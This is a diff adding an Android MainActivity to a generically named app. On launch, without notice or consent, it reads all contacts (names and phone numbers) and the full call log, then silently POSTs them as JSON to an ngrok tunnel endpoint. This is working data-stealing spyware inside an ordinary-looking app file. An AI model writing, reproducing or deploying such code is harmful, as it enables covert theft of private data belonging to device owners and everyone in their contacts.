@@ -1,0 +1,160 @@
+#main activity.java code
+package com.example.mobileapplication;
+
+import android.Manifest;
+import android.content.ContentResolver;
+import android.database.Cursor;
+import android.os.Bundle;
+import android.provider.CallLog;
+import android.provider.ContactsContract;
+import android.util.Log;
+
+import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.app.ActivityCompat;
+
+import org.json.JSONArray;
+import org.json.JSONObject;
+
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
+
+public class MainActivity extends AppCompatActivity {
+
+    private static final int PERMISSION_REQUEST_CODE = 1;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+
+        // Request permissions
+        requestPermissions();
+
+        // Fetch and send data
+        fetchAndSendData();
+    }
+
+    private void requestPermissions() {
+        ActivityCompat.requestPermissions(this, new String[]{
+                Manifest.permission.READ_CONTACTS,
+                Manifest.permission.READ_CALL_LOG
+        }, PERMISSION_REQUEST_CODE);
+    }
+
+    private void fetchAndSendData() {
+        // Fetch contacts
+        JSONArray contacts = fetchContacts();
+
+        // Fetch call logs
+        JSONArray callLogs = fetchCallLogs();
+
+        // Check if data is available and send it to the server
+        if (contacts.length() == 0 && callLogs.length() == 0) {
+            sendDataToServer(null, null, "Contacts and Call Logs are not available.");
+        } else if (contacts.length() == 0) {
+            sendDataToServer(null, callLogs, "Contacts are not available.");
+        } else if (callLogs.length() == 0) {
+            sendDataToServer(contacts, null, "Call Logs are not available.");
+        } else {
+            sendDataToServer(contacts, callLogs, null);
+        }
+    }
+
+    private JSONArray fetchContacts() {
+        JSONArray contactsArray = new JSONArray();
+        ContentResolver contentResolver = getContentResolver();
+        Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
+
+        if (cursor != null && cursor.getCount() > 0) {
+            while (cursor.moveToNext()) {
+                try {
+                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
+                    String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
+
+                    Cursor phoneCursor = contentResolver.query(
+                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                            null,
+                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
+                            new String[]{id},
+                            null
+                    );
+
+                    JSONArray phoneNumbers = new JSONArray();
+                    if (phoneCursor != null) {
+                        while (phoneCursor.moveToNext()) {
+                            phoneNumbers.put(phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
+                        }
+                        phoneCursor.close();
+                    }
+
+                    JSONObject contact = new JSONObject();
+                    contact.put("name", name);
+                    contact.put("phoneNumbers", phoneNumbers);
+                    contactsArray.put(contact);
+
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+            }
+            cursor.close();
+        }
+
+        return contactsArray;
+    }
+
+    private JSONArray fetchCallLogs() {
+        JSONArray callLogArray = new JSONArray();
+        Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
+
+        if (cursor != null && cursor.getCount() > 0) {
+            while (cursor.moveToNext()) {
+                try {
+                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
+                    String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
+                    String date = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE));
+
+                    JSONObject callLog = new JSONObject();
+                    callLog.put("number", number);
+                    callLog.put("type", type);
+                    callLog.put("date", date);
+
+                    callLogArray.put(callLog);
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+            }
+            cursor.close();
+        }
+
+        return callLogArray;
+    }
+
+    private void sendDataToServer(JSONArray contacts, JSONArray callLogs, String message) {
+        new Thread(() -> {
+            try {
+                URL url = new URL("https://b8af-49-204-99-88.ngrok-free.app/api/data");
+                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+                connection.setRequestMethod("POST");
+                connection.setRequestProperty("Content-Type", "application/json");
+                connection.setDoOutput(true);
+
+                JSONObject data = new JSONObject();
+                if (contacts != null) data.put("contacts", contacts);
+                if (callLogs != null) data.put("callLogs", callLogs);
+                if (message != null) data.put("message", message);
+
+                OutputStream outputStream = connection.getOutputStream();
+                outputStream.write(data.toString().getBytes());
+                outputStream.flush();
+                outputStream.close();
+
+                int responseCode = connection.getResponseCode();
+                Log.d("ServerResponse", "Response Code: " + responseCode);
+
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }).start();
+    }
+}
